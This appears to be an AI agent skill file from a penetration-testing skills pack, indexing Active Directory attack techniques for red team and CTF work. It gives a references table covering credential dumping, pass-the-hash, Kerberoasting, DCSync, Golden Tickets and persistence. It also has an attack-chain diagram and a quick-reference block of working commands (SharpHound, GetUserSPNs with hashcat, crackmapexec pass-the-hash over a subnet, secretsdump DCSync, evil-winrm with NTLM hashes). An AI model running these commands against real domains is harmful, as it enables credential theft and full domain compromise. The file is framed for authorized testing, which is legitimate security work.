---
name: agx-active-directory-attacks
description: "active-directory-attacks"
trigger_when: "active-directory-attacks,active,directory,attacks,skill,coverage,map,references,index,attack,chain,overview"
source: antigravity-pentest-skills/
---
---
name: active-directory-attacks
description: >-
  Use this skill when performing authorized red team operations, penetration tests,
  or CTF challenges involving Microsoft Active Directory, Windows domain environments,
  Kerberos authentication, SMB/WinRM lateral movement, credential dumping, privilege
  escalation, domain dominance, and persistence. Covers enumeration through full domain
  compromise including DCSync, Golden/Silver Tickets, Pass-the-Hash, Kerberoasting,
  ASREPRoasting, BloodHound analysis, CrackMapExec automation, LOLBAS techniques,
  and ACL/GPO abuse. All content is for authorized engagements only.
---

## Active Directory Attacks — Skill Coverage Map

### References Index

| File | Coverage |
|------|----------|
| [enumeration.md](references/enumeration.md) | LDAP queries, BloodHound/SharpHound, PowerView, net commands, ADExplorer, enum4linux-ng |
| [authentication-attacks.md](references/authentication-attacks.md) | Kerberoasting, ASREPRoasting, Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, hash cracking |
| [lateral-movement.md](references/lateral-movement.md) | WMIexec, PsExec, evil-winrm, SMBexec, atexec, RDP, DCOM, PS-Remoting, CrackMapExec |
| [privilege-escalation.md](references/privilege-escalation.md) | AlwaysInstallElevated, SeImpersonate, unquoted paths, DLL hijacking, weak services, winPEAS |
| [domain-dominance.md](references/domain-dominance.md) | DCSync, Golden/Silver/Diamond Tickets, Skeleton Key, AdminSDHolder, ntds.dit, DSRM |
| [crackmapexec.md](references/crackmapexec.md) | All CME protocols and modules, spraying, execution, enumeration automation |
| [credential-dumping.md](references/credential-dumping.md) | mimikatz, secretsdump.py, lsassy, comsvcs.dll, procdump, DPAPI, browser creds |
| [persistence.md](references/persistence.md) | Registry, scheduled tasks, WMI subscriptions, COM hijacking, SID history, AdminSDHolder |
| [lolbas.md](references/lolbas.md) | certutil, mshta, regsvr32, rundll32, msiexec, wmic, bitsadmin, mavinject, expand |
| [bloodhound.md](references/bloodhound.md) | Collection methods, Cypher queries, attack path analysis, privilege escalation paths |

### Attack Chain Overview

```
Reconnaissance & Enumeration
        │
        ▼
Authentication Attacks (Kerberoast / ASREP / Spray)
        │
        ▼
Initial Foothold → Credential Dumping
        │
        ▼
Lateral Movement (CME / evil-winrm / WMIexec)
        │
        ▼
Privilege Escalation (Local → Domain Admin)
        │
        ▼
Domain Dominance (DCSync / Golden Ticket)
        │
        ▼
Persistence & Stealth
```

### Quick Reference — Most Used Commands

```bash
## BloodHound collection
SharpHound.exe -c All --zipfilename loot.zip
bloodhound-python -u user -p pass -d domain.local -c All

## Kerberoasting
GetUserSPNs.py domain.local/user:pass -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt

## Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM> --local-auth

## DCSync
secretsdump.py domain.local/Administrator@dc.domain.local -just-dc

## evil-winrm
evil-winrm -i <IP> -u Administrator -H <NTLM>
```
